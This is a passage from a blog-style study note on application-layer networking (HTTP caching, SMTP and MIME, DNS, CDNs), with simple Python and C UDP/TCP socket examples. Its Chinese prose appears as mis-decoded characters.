</span>xxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>æµè§ˆå™¨æ¥å—åˆ°å“åº”æŠ¥æ–‡åï¼Œä¼šåœ¨æœ¬åœ°cookieæ–‡ä»¶é‡Œæ·»åŠ ä¸€è¡ŒæœåŠ¡å™¨çš„ä¸»æœºåå’Œcookieå€¼ï¼Œéšåæ¯æ¬¡å¯¹è¯¥webçš„è¯·æ±‚éƒ½ä¼šå¸¦æœ‰cookieé¦–éƒ¨è¡Œ</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxxxxxxxxxx</span><br></pre></td></tr></table></figure><h3 id="webç¼“å­˜å™¨-ä»£ç†æœåŠ¡å™¨"><a href="#webç¼“å­˜å™¨-ä»£ç†æœåŠ¡å™¨" class="headerlink" title="webç¼“å­˜å™¨(ä»£ç†æœåŠ¡å™¨)"></a>webç¼“å­˜å™¨(ä»£ç†æœåŠ¡å™¨)</h3><p>å¯ä»¥é…ç½®æµè§ˆå™¨ï¼Œä½¿httpè¯·æ±‚é¦–å…ˆç»è¿‡webç¼“å­˜å™¨ï¼Œå¦‚æœwebç¼“å­˜å™¨å­˜æœ‰è¯·æ±‚å¯¹è±¡çš„å‰¯æœ¬ï¼Œç›´æ¥è¿”å›ç»™æµè§ˆå™¨ï¼Œå¦åˆ™ç¼“å­˜å™¨å‘åŸå§‹æœåŠ¡å™¨httpè¯·æ±‚ï¼ŒæŠŠå“åº”å¯¹è±¡å­˜å‚¨åˆ°webç¼“å­˜å™¨ï¼Œå†é€šè¿‡webç¼“å­˜å™¨å’Œæµè§ˆå™¨åŸæœ¬çš„tcpè¿æ¥æŠŠå¯¹è±¡å†è¿”å›ç»™æµè§ˆå™¨</p><blockquote><p>äºŒå…«å®šå¾‹ï¼Œä½¿ç¼“å­˜æ•ˆæœè‰¯å¥½</p></blockquote><h4 id="æ¡ä»¶getæ–¹æ³•"><a href="#æ¡ä»¶getæ–¹æ³•" class="headerlink" title="æ¡ä»¶getæ–¹æ³•"></a>æ¡ä»¶getæ–¹æ³•</h4><p>ä¸ºäº†é¿å…webç¼“å­˜å™¨é‡Œçš„å‰¯æœ¬å’ŒåŸå§‹æœåŠ¡å™¨é‡Œçš„ç‰ˆæœ¬ä¸ä¸€è‡´ï¼Œå­˜åœ¨ä¸€ç§æœºåˆ¶:æ¡ä»¶getæ–¹æ³•</p><p>è¯·æ±‚æŠ¥æ–‡ä½¿ç”¨getæ–¹æ³•ï¼ŒåŒ…å«<code>If-Modified-Sinceï¼š</code>é¦–éƒ¨è¡Œï¼Œå°±æ˜¯ä¸€ä¸ªæ¡ä»¶getè¯·æ±‚æŠ¥æ–‡</p><p><strong>å…·ä½“è¿‡ç¨‹</strong></p><p>webç¼“å­˜å™¨å‘åŸå§‹æœåŠ¡å™¨è¯·æ±‚å¯¹è±¡ï¼ŒæœåŠ¡å™¨å‘é€çš„å“åº”æŠ¥æ–‡é‡Œä¸‹é¢ä¸€å¥</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Last-Modified</span><span class="punctuation">: </span>Wed, 9 Sep 2023 06:23:45</span><br></pre></td></tr></table></figure><p>ç¼“å­˜å™¨å­˜å‚¨å¯¹è±¡æ—¶ä¼šè®°ä¸‹ä¿®æ”¹æ—¶é—´</p><p>ä¸€æ®µæ—¶é—´ç”¨æˆ·å†æ¬¡è¯·æ±‚è¯¥å¯¹è±¡æ—¶ï¼Œç¼“å­˜å™¨ä¼šå‘æœåŠ¡å™¨å‘é€æ¡ä»¶getè¯·æ±‚æŠ¥æ–‡</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">Get /path/xxx.jpg HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.grxer.com</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Wed, 9 Sep 2023 06:23:45</span><br></pre></td></tr></table></figure><p>å¦‚æœå¯¹è±¡å·²ç»ä¿®æ”¹ï¼Œåœ¨getå®ä½“ä½“é‡Œè¿”å›200ok å®ä½“ä½“é‡ŒåŒ…å«è¯¥å¯¹è±¡ï¼Œå¦åˆ™è¿”å›304 Not Modified,å‘Šè¯‰webç¼“å­˜å™¨å¯ä»¥ç›´æ¥ä½¿ç”¨è¯¥å¯¹è±¡</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">304</span> Not Modified</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="language-clojure">(<span class="name"><span class="built_in">empty</span></span> entity body)</span></span><br></pre></td></tr></table></figure><h2 id="E-Mail"><a href="#E-Mail" class="headerlink" title="E-Mail"></a>E-Mail</h2><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230828230533757.png" alt="image-20230828230533757"></p><p>ä¸‰ä¸ªé‡è¦ç»„æˆéƒ¨åˆ†</p><ul><li>ç”¨æˆ·ä»£ç† user agent</li><li>é‚®ä»¶æœåŠ¡å™¨ mail server </li><li>ç®€å•é‚®ä»¶ä¼ è¾“åè®®SMTP simple mail transfer protocol</li></ul><h3 id="SMTP-æ¨åè®®"><a href="#SMTP-æ¨åè®®" class="headerlink" title="SMTP(æ¨åè®®)"></a>SMTP(æ¨åè®®)</h3><p>ä½¿ç”¨TCPä½œä¸ºä¼ è¾“å±‚åè®® é»˜è®¤25å·ç«¯å£ï¼Œè¿ç»­è¿æ¥</p><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230829110643721.png" alt="image-20230829110643721"></p><p>é‚®ä»¶æœåŠ¡å™¨ï¼ŒTCPè¿æ¥å»ºç«‹åä¼šï¼Œè¿›è¡ŒSMTPæ¡æ‰‹æ¥ç¡®è®¤æ”¶å‘æ–¹åœ°å€ç­‰ç­‰ï¼Œä¹‹åå‘é€æŠ¥æ–‡</p><p>æŠ¥æ–‡åˆ†ä¸ºé¦–éƒ¨å’Œä¸»ä½“ï¼Œç”±ä¸€ä¸ªç©ºè¡Œéš”å¼€ï¼ŒæŠ¥æ–‡å¿…é¡»ä¸º7ä½asciiç¼–ç </p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">From:hello@xxx.com</span><br><span class="line">To:world@xxx.com</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">ä¸»ä½“å†…å®¹</span><br></pre></td></tr></table></figure><h4 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a><a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E7%94%A8%E9%80%94%E4%BA%92%E8%81%AF%E7%B6%B2%E9%83%B5%E4%BB%B6%E6%93%B4%E5%B1%95">MIME</a></h4><p>å¯¹äºä¸€äº›ä¸èƒ½ç”¨asciiç¼–ç è¡¨ç¤ºçš„æ•°æ®é‡‡ç”¨äº†MIME (Multipurpose Internet Mail Extensions)å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹</p><p>ä½¿ç”¨MIMEéœ€è¦åŒ…å«ä¸€äº›é¦–éƒ¨è¡Œ</p><p>MIMEç‰ˆæœ¬</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">MIME-Version</span><span class="punctuation">: </span>1.0</span><br></pre></td></tr></table></figure><p>å†…å®¹ç±»å‹</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>[type]/[subtype]; parameter</span><br></pre></td></tr></table></figure><p>å†…å®¹ä¼ è¾“ç¼–ç æ–¹å¼</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Transfer-Encoding</span><span class="punctuation">: </span>[mechanism]</span><br></pre></td></tr></table></figure><p>mechanismçš„å€¼å¯ä»¥æŒ‡å®šä¸ºâ€œ7bitâ€ï¼Œâ€œ8bitâ€ï¼Œâ€œbinaryâ€ï¼Œâ€œquoted-printableâ€ï¼Œâ€œbase64â€ã€‚</p><h3 id="é‚®ä»¶è®¿é—®åè®®-æ‹‰åè®®"><a href="#é‚®ä»¶è®¿é—®åè®®-æ‹‰åè®®" class="headerlink" title="é‚®ä»¶è®¿é—®åè®®(æ‹‰åè®®)"></a>é‚®ä»¶è®¿é—®åè®®(æ‹‰åè®®)</h3><p>POP3 Post Office Protocolâ€“Version 3,ç¬¬ä¸‰ç‰ˆé‚®ä»¶åè®®</p><p>IMAP Internet Mail Access Protocol ï¼Œå› ç‰¹ç½‘é‚®ä»¶è®¿é—®åè®®</p><p>HTTP</p><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p><strong>Domain Name System</strong> åŸŸåç³»ç»Ÿï¼Œä¸»è¦åŠŸèƒ½æ˜¯å°†ä¸»æœºåè§£æä¸ºipåœ°å€ï¼Œé€šå¸¸æ˜¯ç”±å…¶ä»–åº”ç”¨å±‚åè®®æ‰€ä½¿ç”¨</p><p>DNSè¿è¡Œåœ¨UDPä¹‹ä¸Šï¼Œé»˜è®¤ä½¿ç”¨53å·ç«¯å£</p><p>DNSé‡‡ç”¨åˆ†å¸ƒå¼ï¼Œåˆ†å±‚æ•°æ®åº“ï¼Œå¤§è‡´åˆ†ä¸ºä¸‰ç§ç±»å‹çš„æœåŠ¡å™¨</p><ul><li>æ ¹DNSæœåŠ¡å™¨</li><li>é¡¶çº§åŸŸ(Top-Level Domain,TLD)DNSæœåŠ¡å™¨</li><li>æƒå¨DNSæœåŠ¡å™¨</li></ul><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230829180249922.png" alt="image-20230829180249922"></p><p>DNSæŸ¥è¯¢æœ‰ä¸¤ç§æ–¹å¼ï¼š<strong>é€’å½’</strong>å’Œ<strong>è¿­ä»£</strong>ã€‚DNSå®¢æˆ·ç«¯è®¾ç½®ä½¿ç”¨çš„DNSæœåŠ¡å™¨ä¸€èˆ¬éƒ½æ˜¯é€’å½’æœåŠ¡å™¨ï¼Œå®ƒè´Ÿè´£å…¨æƒå¤„ç†å®¢æˆ·ç«¯çš„DNSæŸ¥è¯¢è¯·æ±‚ï¼Œç›´åˆ°è¿”å›æœ€ç»ˆç»“æœã€‚è€ŒDNSæœåŠ¡å™¨ä¹‹é—´ä¸€èˆ¬é‡‡ç”¨è¿­ä»£æŸ¥è¯¢æ–¹å¼ã€‚</p><blockquote><p><strong>é€’å½’ï¼š</strong>DNSæœåŠ¡å™¨æ¥æ”¶åˆ°å®¢æˆ·æœºè¯·æ±‚ï¼Œå¿…é¡»ä½¿ç”¨ä¸€ä¸ªå‡†ç¡®çš„æŸ¥è¯¢ç»“æœå›å¤å®¢æˆ·æœºã€‚å¦‚æœDNSæœåŠ¡å™¨æœ¬åœ°æ²¡æœ‰å­˜å‚¨æŸ¥è¯¢DNS ä¿¡æ¯ï¼Œé‚£ä¹ˆè¯¥æœåŠ¡å™¨ä¼šè¯¢é—®å…¶ä»–æœåŠ¡å™¨ï¼Œå¹¶å°†è¿”å›çš„æŸ¥è¯¢ç»“æœæäº¤ç»™å®¢æˆ·æœºã€‚</p><p><strong>è¿­ä»£ï¼š</strong>DNSæœåŠ¡å™¨æœ¬åœ°å¦‚æœæ²¡æœ‰è¯·æ±‚çš„DNSä¿¡æ¯ï¼Œä¼šå‘å®¢æˆ·æœºè¿”å›èƒ½å¤Ÿè§£æè¯¥æŸ¥è¯¢è¯·æ±‚çš„DNSæœåŠ¡å™¨åœ°å€ï¼Œå®¢æˆ·æœºå†å‘è¿™å°DNS æœåŠ¡å™¨æäº¤è¯·æ±‚ï¼Œä¾æ¬¡å¾ªç¯ç›´åˆ°è¿”å›æŸ¥è¯¢çš„ç»“æœ</p></blockquote><p>è®¿é—® <a href="http://www.ytu.edu.cn/">www.ytu.edu.cn</a></p><ul><li><p>å®¢æˆ·ç«¯å‘é€æŸ¥è¯¢æŠ¥æ–‡â€query <a href="http://www.ytu.edu.cn" è‡³æœ¬åœ°dnsæœåŠ¡å™¨(ä¸€èˆ¬ä¸ºé€’å½’æœåŠ¡å™¨),dnsæœåŠ¡å™¨é¦–å…ˆæ£€æŸ¥è‡ªèº«ç¼“å­˜,å¦‚æœå­˜åœ¨è®°å½•åˆ™ç›´æ¥è¿”å›ç»“æœ ">www.ytu.edu.cn&quot;è‡³æœ¬åœ°DNSæœåŠ¡å™¨(ä¸€èˆ¬ä¸ºé€’å½’æœåŠ¡å™¨)ï¼ŒDNSæœåŠ¡å™¨é¦–å…ˆæ£€æŸ¥è‡ªèº«ç¼“å­˜ï¼Œå¦‚æœå­˜åœ¨è®°å½•åˆ™ç›´æ¥è¿”å›ç»“æœ</a></p></li><li><p>å¦‚æœè®°å½•è€åŒ–æˆ–ä¸å­˜åœ¨ï¼Œåˆ™</p><p>1.DNSæœåŠ¡å™¨å‘æ ¹åŸŸåæœåŠ¡å™¨å‘é€æŸ¥è¯¢æŠ¥æ–‡â€query <a href="http://www.ytu.edu.cn" ,æ ¹åŸŸåæœåŠ¡å™¨è¿”å›é¡¶çº§åŸŸ ">www.ytu.edu.cn&quot;ï¼Œæ ¹åŸŸåæœåŠ¡å™¨è¿”å›é¡¶çº§åŸŸ</a> <code>.cn</code> çš„é¡¶çº§åŸŸåæœåŠ¡å™¨åœ°å€ã€‚</p><p>2.DNSæœåŠ¡å™¨å‘ <code>.cn</code> åŸŸçš„é¡¶çº§åŸŸåæœåŠ¡å™¨å‘é€æŸ¥è¯¢æŠ¥æ–‡â€query <a href="http://www.ytu.edu.cn" ,å¾—åˆ°äºŒçº§åŸŸ ">www.ytu.edu.cn&quot;ï¼Œå¾—åˆ°äºŒçº§åŸŸ</a> <code>.edu.cn</code> çš„æƒå¨åŸŸåæœåŠ¡å™¨åœ°å€ã€‚</p><p>3.DNSæœåŠ¡å™¨å‘ <code>.edu.cn</code> åŸŸçš„æƒå¨åŸŸåæœåŠ¡å™¨å‘é€æŸ¥è¯¢æŠ¥æ–‡â€query <a href="http://www.ytu.edu.cn" ,å¾—åˆ°ä¸»æœº ">www.ytu.edu.cn&quot;ï¼Œå¾—åˆ°ä¸»æœº</a> www çš„Aè®°å½•ï¼Œå­˜å…¥è‡ªèº«ç¼“å­˜å¹¶è¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p></li></ul><p>DNSæœåŠ¡å™¨é‡Œå­˜å‚¨äº†èµ„æºè®°å½•(Resource Record,RR),æ˜¯ä¸€ä¸ªå››å…ƒç»„</p><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230830170605836.png" alt="image-20230830170605836"></p><p><strong>DNSæŠ¥æ–‡</strong></p><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230830181152543.png" alt="image-20230830181152543"></p><p>wiresharkä¸€ä¸ªdnsè¿”å›æŠ¥æ–‡</p><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230902212408489.png" alt="image-20230902212408489"></p><h2 id="P2P"><a href="#P2P" class="headerlink" title="P2P"></a>P2P</h2><p>p2pæ–‡ä»¶åˆ†å‘åè®® BitTorrent </p><h2 id="è§†é¢‘æµå’Œå†…å®¹åˆ†å‘ç½‘"><a href="#è§†é¢‘æµå’Œå†…å®¹åˆ†å‘ç½‘" class="headerlink" title="è§†é¢‘æµå’Œå†…å®¹åˆ†å‘ç½‘"></a>è§†é¢‘æµå’Œå†…å®¹åˆ†å‘ç½‘</h2><p>æµå¼è§†é¢‘å æ®ISPæµé‡çš„å¤§éƒ¨åˆ†ï¼Œç”±äºhttpæµå­˜åœ¨ç¼ºé™·ï¼Œä¸€èˆ¬é‡‡ç”¨DASH(Dynmic Adaptive Streaming over Http)ï¼šç»HTTPçš„åŠ¨æ€é€‚åº”æ€§æµæ¥ä¼ è¾“</p><h3 id="DASH"><a href="#DASH" class="headerlink" title="DASH"></a>DASH</h3><p>æœåŠ¡å™¨:</p><ul><li>å°†è§†é¢‘æ–‡ä»¶åˆ†å‰²æˆå¤šä¸ªå—</li><li>æ¯ä¸ªå—ç‹¬ç«‹å­˜å‚¨ï¼Œç¼–ç äºä¸åŒç ç‡ï¼ˆ8-10ç§ï¼‰</li><li>å‘Šç¤ºæ–‡ä»¶ï¼ˆmanifest fileï¼‰: æä¾›ä¸åŒå—ä¸åŒç ç‡çš„URL</li></ul><p>å®¢æˆ·ç«¯:</p><ul><li>å…ˆè·å–å‘Šç¤ºæ–‡ä»¶</li><li>å‘¨æœŸæ€§åœ°æµ‹é‡æœåŠ¡å™¨åˆ°å®¢æˆ·ç«¯çš„å¸¦å®½</li><li>æŸ¥è¯¢å‘Šç¤ºæ–‡ä»¶,åœ¨ä¸€ä¸ªæ—¶åˆ»è¯·æ±‚ä¸€ä¸ªå—ï¼ŒHTTPå¤´éƒ¨æŒ‡å®šå­—èŠ‚èŒƒå›´<ul><li>å¦‚æœå¸¦å®½è¶³å¤Ÿï¼Œé€‰æ‹©æœ€å¤§ç ç‡çš„è§†é¢‘å—</li><li>ä¼šè¯ä¸­çš„ä¸åŒæ—¶åˆ»ï¼Œå¯ä»¥åˆ‡æ¢è¯·æ±‚ä¸åŒçš„ç¼–ç å— (å–å†³äºå½“æ—¶çš„å¯ç”¨å¸¦å®½)</li></ul></li></ul><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>Content Distribution Networks å†…å®¹åˆ†å‘ç½‘ç»œ</p><p>ä¸ºäº†è§£å†³é«˜å¹¶å‘æµåª’ä½“æœåŠ¡ï¼Œé€šè¿‡cdnå…¨ç½‘éƒ¨ç½²ç¼“å­˜èŠ‚ç‚¹ï¼Œå­˜å‚¨æœåŠ¡å†…å®¹ï¼Œå°±è¿‘ä¸ºç”¨æˆ·æä¾›æœåŠ¡ï¼Œæé«˜ç”¨æˆ·ä½“éªŒ</p><p>æ€ä¹ˆè®©ç”¨æˆ·çŸ¥é“éƒ¨ç½²çš„cdnæœåŠ¡å™¨åœ¨å“ªï¼Ÿ</p><ol><li><p>é€šè¿‡manifest fileæ–‡ä»¶é‡Œå†™å…¥cdnä¿¡æ¯</p></li><li><p>æˆ–è€…cdnåˆ©ç”¨dnsæˆªè·å’Œé‡å®šå‘è¯·æ±‚(å¤§å¤šæ•°)</p></li></ol><p>åˆ©ç”¨dnsæˆªè·å’Œé‡å®šå‘è¯·æ±‚</p><ol><li>ç”¨æˆ·çš„æœ¬åœ° DNS æœåŠ¡å™¨ï¼ˆLDNSï¼‰å°†è¯¥ DNS è¯·æ±‚ä¸­ç»§åˆ°ç›®æ ‡æœåŠ¡å™¨çš„æƒå¨ DNS æœåŠ¡å™¨<em>ï¼Œ</em>ç›®æ ‡æœåŠ¡å™¨çš„æƒå¨DNSæœåŠ¡å™¨å¹¶ä¸è¿”å›ä¸€ä¸ª IP åœ°å€ï¼Œè€Œæ˜¯å‘ LDNS è¿”å›ä¸€ä¸ªç¬¬ä¸‰æ–¹ CDN çš„ä¸»æœºå</li><li>LDNSå†å‘é€å¯¹ç¬¬ä¸‰æ–¹CDNçš„ä¸»æœºåçš„DNSè¯·æ±‚ï¼Œç¬¬ä¸‰æ–¹CDNä¸“ç”¨DNSåŸºç¡€è®¾æ–½æ ¹æ®å®ƒçš„é€‰æ‹©ç­–ç•¥å°†æœ€ç¬¦åˆçš„CDNçš„IPåœ°å€ç»™LDNS</li><li>LDNSå°†è¯¥CDNè½¬å‘ç»™ç”¨æˆ·ä¸»æœº</li><li>ä¸»æœºå»ºç«‹äºCDNçš„TCPè¿æ¥ï¼Œå‘é€http getè¯·æ±‚ï¼Œå¦‚æœä½¿ç”¨dashï¼Œä¼šå…ˆè·å–å‘Šç¤ºæ–‡ä»¶ç­‰ç­‰</li></ol><h2 id="å¥—æ¥å­—ç¼–ç¨‹"><a href="#å¥—æ¥å­—ç¼–ç¨‹" class="headerlink" title="å¥—æ¥å­—ç¼–ç¨‹"></a>å¥—æ¥å­—ç¼–ç¨‹</h2><h3 id="UDPâ€“python"><a href="#UDPâ€“python" class="headerlink" title="UDPâ€“python"></a>UDPâ€“python</h3><p>UDPServer</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">serverPort=<span class="number">1234</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">åˆ›å»º Socket</span></span><br><span class="line"><span class="string">åœ°å€ç°‡: AF_INET (IPv4)</span></span><br><span class="line"><span class="string">ç±»å‹: SOCK_DGRAM (ä½¿ç”¨ UDP ä¼ è¾“æ§åˆ¶åè®®)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">serverSocket=socket(AF_INET,SOCK_DGRAM)</span><br><span class="line"><span class="comment">#ç»‘å®šåœ°å€ï¼ˆhost,portï¼‰åˆ°å¥—æ¥å­—,ä»»ä½•å‘portå‘é€çš„åˆ†ç»„å°†å¯¼å‘è¯¥å¥—æ¥å­—</span></span><br><span class="line">serverSocket.bind((<span class="string">&#x27;&#x27;</span>,serverPort))<span class="comment">#host=&#x27;&#x27;è¡¨ç¤ºç»‘å®šåˆ°æ‰€æœ‰å¯ç”¨æ¥å£</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#recvfromæ¥æ”¶UDPæ•°æ®,éœ€è¦æŒ‡å®šæ¥æ”¶æ•°æ®çš„æœ€å¤§é•¿åº¦,è¿”å›å€¼æ˜¯ï¼ˆdata,addressï¼‰</span></span><br><span class="line">    <span class="comment">#addressæ˜¯å®¢æˆ·ipåœ°å€å’Œç«¯å£å·çš„å…ƒç»„(ipaddrï¼Œportï¼‰</span></span><br><span class="line">    message,clientAddr=serverSocket.recvfrom(<span class="number">2048</span>)</span><br><span class="line">    modifiedMessage=message.decode().upper()</span><br><span class="line">    <span class="comment">#sendtoå‘é€UDPæ•°æ®,å‚æ•°äºŒaddressæ˜¯å½¢å¼ä¸ºï¼ˆipaddrï¼Œportï¼‰çš„å…ƒç»„</span></span><br><span class="line">    serverSocket.sendto(modifiedMessage.encode(),clientAddr)</span><br></pre></td></tr></table></figure><p>UDPClient</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">serverName=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">serverPort=<span class="number">1234</span></span><br><span class="line"><span class="comment">#æ“ä½œç³»ç»Ÿä¼šä¸ºæˆ‘ä»¬çš„socketåˆ†é…ä¸€ä¸ªç«¯å£å·</span></span><br><span class="line">clientSocket=socket(AF_INET,SOCK_DGRAM)</span><br><span class="line">message=<span class="built_in">input</span>(<span class="string">&#x27;string--&gt;STRING: &#x27;</span>)</span><br><span class="line">clientSocket.sendto(message.encode(),(serverName,serverPort))</span><br><span class="line">modifiedMessage,serverAddr=clientSocket.recvfrom(<span class="number">2048</span>)</span><br><span class="line"><span class="built_in">print</span>(modifiedMessage.decode())</span><br><span class="line">clientSocket.close()</span><br></pre></td></tr></table></figure><h3 id="TCPâ€“python"><a href="#TCPâ€“python" class="headerlink" title="TCPâ€“python"></a>TCPâ€“python</h3><p>TCPServer</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">serverPort=<span class="number">1234</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">åˆ›å»º Socket</span></span><br><span class="line"><span class="string">åœ°å€ç°‡address family: AF_INET (IPv4)</span></span><br><span class="line"><span class="string">ç±»å‹: SOCK_STREAM (ä½¿ç”¨ TCP ä¼ è¾“æ§åˆ¶åè®®)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">serverSocket=socket(AF_INET,SOCK_STREAM)</span><br><span class="line">serverSocket.bind((<span class="string">&#x27;&#x27;</span>,serverPort))</span><br><span class="line"><span class="comment">#å¼€å§‹TCPç›‘å¬,å‚æ•°backlogæŒ‡å®šåœ¨æ‹’ç»è¿æ¥ä¹‹å‰ï¼Œæ“ä½œç³»ç»Ÿå¯ä»¥æŒ‚èµ·çš„æœ€å¤§è¿æ¥æ•°é‡ï¼Œå¯ä»¥ç†è§£ä¸ºæœ€å¤§æ’é˜Ÿæ•°é‡</span></span><br><span class="line">serverSocket.listen(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="comment">#é˜»å¡çš„è¢«åŠ¨ç­‰å¾…tcpè¿æ¥,æ¡æ‰‹å®Œæˆåå»ºç«‹TCPè¿æ¥,è¿”å›æ–°å¥—æ¥å­—</span></span><br><span class="line">  connectionSocket,addr=serverSocket.accept()</span><br><span class="line">  <span class="built_in">print</span>(addr)</span><br><span class="line">  <span class="comment">#æ¥æ”¶TCPæ•°æ®</span></span><br><span class="line">  message=connectionSocket.recv(<span class="number">1024</span>)</span><br><span class="line">  modifiedMessage=message.decode().upper()</span><br><span class="line">  <span class="comment">#å‘é€ TCP æ•°æ®ï¼Œå·²ç»tcpå»ºç«‹è¿æ¥ï¼Œä¸ç”¨æ˜¾ç¤ºæŒ‡æ˜ipå’Œport</span></span><br><span class="line">  connectionSocket.send(modifiedMessage.encode())</span><br><span class="line">  connectionSocket.close()</span><br></pre></td></tr></table></figure><p>TCPClient</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">serverName=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">serverPort=<span class="number">1234</span></span><br><span class="line">clientSocket=socket(AF_INET,SOCK_STREAM)</span><br><span class="line"><span class="comment">#ä¸‰æ¬¡æ¡æ‰‹å»ºç«‹tcpè¿æ¥</span></span><br><span class="line">clientSocket.connect((serverName,serverPort))</span><br><span class="line">message=<span class="built_in">input</span>(<span class="string">&#x27;string--&gt;STRING: &#x27;</span>)</span><br><span class="line">clientSocket.send(message.encode())</span><br><span class="line">modifiedMessage,serverAddr=clientSocket.recvfrom(<span class="number">2048</span>)</span><br><span class="line"><span class="built_in">print</span>(modifiedMessage.decode())</span><br><span class="line">clientSocket.close()</span><br></pre></td></tr></table></figure><h3 id="UDPâ€“linux-C"><a href="#UDPâ€“linux-C" class="headerlink" title="UDPâ€“linux C"></a>UDPâ€“linux C</h3><p>UDPServer</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 2048</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXQUEUE 5</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">stringLow2Upper</span><span class="params">(<span class="type">char</span> *<span class="built_in">string</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="built_in">strlen</span>(<span class="built_in">string</span>); i++) &#123;</span><br><span class="line">       <span class="built_in">string</span>[i] =<span class="built_in">toupper</span>(<span class="built_in">string</span>[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverSockaddr</span>;</span></span><br><span class="line">    serverSockaddr.sin_family = AF_INET;</span><br><span class="line">    serverSockaddr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">    serverSockaddr.sin_port = htons(PORT);</span><br><span class="line">    <span class="comment">//åˆ›å»ºudp socket</span></span><br><span class="line">    <span class="type">int</span> serverSocket = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//ç»‘å®šsocketåˆ°æœ¬åœ°ç«¯å£</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">-1</span> == bind(serverSocket, (<span class="keyword">struct</span> sockaddr *)&amp;serverSockaddr,</span><br><span class="line">                   <span class="keyword">sizeof</span>(serverSockaddr))) &#123;</span><br><span class="line">        perror(<span 